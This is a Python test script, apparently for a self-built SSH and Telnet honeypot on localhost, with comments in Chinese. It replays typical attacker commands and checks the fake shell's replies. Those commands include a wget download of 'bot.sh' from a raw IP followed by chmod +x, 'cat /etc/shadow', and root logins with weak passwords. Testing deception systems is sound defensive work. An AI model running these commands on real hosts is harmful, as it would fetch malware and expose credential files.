# -*- coding: utf-8 -*-
"""蜜罐功能自动化测试：SSH (paramiko) + Telnet (raw socket)"""
import socket
import sys
import time

HOST = "127.0.0.1"
SSH_PORT = 2222
TELNET_PORT = 2323


def test_ssh_exec():
    """测试 SSH exec 模式（非交互命令执行）"""
    import paramiko
    print("=== [1] SSH exec 模式 ===")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, SSH_PORT, username="root", password="toor123", timeout=10)
    _, stdout, _ = client.exec_command("uname -a; whoami; cat /etc/passwd | head -3")
    out = stdout.read().decode("utf-8", errors="replace")
    print(out[:400])
    client.close()
    assert "Linux svr01" in out, "uname 输出异常"
    print(">>> SSH exec 通过\n")


def test_ssh_shell():
    """测试 SSH 交互式 shell"""
    import paramiko
    print("=== [2] SSH 交互式 Shell ===")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, SSH_PORT, username="root", password="toor123", timeout=10)
    chan = client.invoke_shell(term="xterm")
    time.sleep(1.5)

    def drain():
        time.sleep(0.6)
        data = b""
        while chan.recv_ready():
            data += chan.recv(65535)
        return data.decode("utf-8", errors="replace")

    banner = drain()
    print("--- banner ---")
    print(banner[:300])

    transcript = ""
    for cmd in ["pwd", "ls -la", "cd /etc", "pwd", "cat hostname",
                "cd ~", "ls", "cat notes.txt", "wget http://45.155.204.1/bot.sh",
                "chmod +x bot.sh", "history", "id"]:
        chan.send(cmd + "\n")
        transcript += drain()

    chan.send("exit\n")
    transcript += drain()
    client.close()

    print("--- shell 交互输出（节选） ---")
    print(transcript[:1500])
    assert "svr01" in transcript, "cat hostname 无输出"
    assert "rotate db credentials" in transcript, "cat notes.txt 无输出"
    assert "bot.sh" in transcript, "wget 模拟失败"
    print(">>> SSH 交互式 Shell 通过\n")


def test_telnet():
    """测试 Telnet 协议（原始 socket + IAC 处理）"""
    print("=== [3] Telnet ===")
    IAC = 255
    sock = socket.create_connection((HOST, TELNET_PORT), timeout=10)
    sock.settimeout(3)

    def read_until(marker, timeout=5):
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                # 应答所有 IAC 协商：WILL->DONT, DO->WONT
                while bytes([IAC]) in data:
                    i = data.find(bytes([IAC]))
                    if i + 2 >= len(data):
                        break
                    cmd, opt = data[i + 1], data[i + 2]
                    if cmd == 251:      # WILL
                        sock.sendall(bytes([IAC, 254, opt]))
                    elif cmd == 253:    # DO
                        sock.sendall(bytes([IAC, 252, opt]))
                    data = data[:i] + data[i + 3:]
                if marker.encode() in data:
                    return data.decode("utf-8", errors="replace")
            except socket.timeout:
                break
        return data.decode("utf-8", errors="replace")

    login_banner = read_until("login:")
    print("--- login banner ---")
    print(login_banner[:200])
    assert "login:" in login_banner, "未收到 login 提示"

    sock.sendall(b"root\r\n")
    pw_prompt = read_until("Password:")
    assert "Password:" in pw_prompt, "未收到密码提示"

    sock.sendall(b"123456\r\n")
    shell_banner = read_until("#")
    print("--- shell banner ---")
    print(shell_banner[:300])
    assert "Welcome to Ubuntu" in shell_banner, "登录后无欢迎信息"

    transcript = ""
    for cmd in ["whoami", "ls /", "cat /etc/shadow", "uname -a", "df -h"]:
        sock.sendall(cmd.encode() + b"\r\n")
        transcript += read_until("#")

    print("--- 命令输出（节选） ---")
    print(transcript[:1200])
    assert "root" in transcript, "whoami 无输出"
    assert "shadow" in transcript or "$6$" in transcript, "cat /etc/shadow 无输出"

    sock.sendall(b"exit\r\n")
    time.sleep(0.5)
    sock.close()
    print(">>> Telnet 通过\n")


if __name__ == "__main__":
    test_ssh_exec()
    test_ssh_shell()
    test_telnet()
    print("=" * 40)
    print("全部测试通过！")
